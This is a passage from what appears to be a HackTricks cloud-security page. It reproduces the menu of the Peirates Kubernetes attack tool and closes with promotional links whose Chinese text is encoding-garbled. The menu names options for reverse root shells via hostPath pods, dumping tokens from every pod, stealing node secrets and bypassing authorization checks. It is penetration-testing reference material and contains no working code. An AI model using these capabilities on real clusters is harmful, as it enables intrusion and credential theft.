[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
